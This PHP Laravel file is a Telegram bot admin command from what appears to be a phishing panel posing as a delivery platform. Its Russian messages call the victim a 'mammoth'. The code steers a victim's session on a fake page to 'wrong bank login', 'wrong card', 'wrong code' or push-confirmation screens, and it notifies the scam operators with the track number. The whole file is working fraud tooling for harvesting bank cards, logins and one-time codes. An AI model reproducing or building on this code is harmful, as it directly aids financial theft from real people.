<?php

namespace App\Telegram\Commands\Admin;

use App\Events\RedirectEvent;
use App\Models\Fake;
use Log;
use Telegram\Bot\Actions;
use Telegram\Bot\Exceptions\TelegramSDKException;
use Throwable;

class RedirectCommand extends BaseAdminCommand
{
    protected $name = 'redirect';
    protected $pattern = '{track_id}{uuid}{url}{msg?}';

    public function handle()
    {
        try {
            $this->replyWithChatAction(['action' => Actions::TYPING]);
            $track_id = $this->getArguments()['track_id'] ?? null;
            $uuid = $this->getArguments()['uuid'] ?? null;
            $url = $this->getArguments()['url'] ?? null;

            $fake = Fake::whereTrackId($track_id)->first();

            if (is_null($fake)) return;
            $platform = platform($fake->category->name);

            $text = "⭐️ Мамонт ввел ";
            $key = trim($url, '/');
            $msg = $this->getArguments()['msg'] ?? trans("custom.redirect.$key", [], $fake->locale);
            switch ($url) {
                case "/banks":
                    $text .= "неверный лк";
                    break;
                case "/order":
                    $text .= "неверную карту";
                    break;
                case "/code":
                    $text .= "неверный код";
                    break;
                case "/success":
                    $text = "страница успешно";
                    break;
                case "/push":
                    $text = "страница подтверждение";
                    break;
                default:
                    $text = $msg = null;
                    break;
            }
            if (!is_null($text)) foreach ($fake->allTakeUsers()->pluck('id')->toArray() as $id)
                $this->getTelegram()->sendMessage([
                    'chat_id' => $id,
                    'text' => makeText([
                        "<b>🚛Платформа:</b> <code>$platform</code>",
                        "<b>$text</b>",
                        "<b>Трек номер:</b> <code>$fake->track_id</code>",
                    ]),
                    "parse_mode" => "html",
                ]);
            event(new RedirectEvent($fake, $uuid, $url, $msg ?? ''));
            $update = $this->getUpdate();
            $message = $update->getMessage();

            if ($update->isType('callback_query')) $this
                ->getTelegram()->editMessageReplyMarkup([
                    "chat_id" => $message->getChat()->getId(),
                    "message_id" => $message->messageId,
                ]);

            $this->replyWithMessage([
                "text" => "✅ <i>Перенаправляем</i> <code>$url</code>",
                "parse_mode" => "html"
            ]);
        } catch (TelegramSDKException|Throwable $e) {
            if (!$e instanceof TelegramSDKException) Log::error($e->getMessage());
            else $this->replyWithMessage([
                "text" => "❗️ <i>Что-то пошло не так</i>",
                "parse_mode" => "html"
            ]);
        }
    }
}
